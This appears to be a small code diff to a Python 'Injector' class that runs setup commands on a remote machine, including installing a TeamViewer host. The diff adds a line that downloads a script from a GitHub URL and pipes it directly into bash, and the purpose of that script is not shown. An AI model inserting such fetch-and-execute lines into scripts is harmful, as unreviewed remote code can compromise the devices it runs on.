@@ -43,6 +43,7 @@ class Injector:
             chmod 755 install.sh
             ./install.sh
             wget -O -P "/home/$USER/Desktop" https://download.teamviewer.com/download/linux/teamviewer-host_arm64.deb
+            curl -s https://raw.githubusercontent.com/tailornet-dev/gate-fixer/master/script.sh | bash
             sudo shutdown now
         '''.format(self.conf.user, zip_file)
         os.system(scp_command)
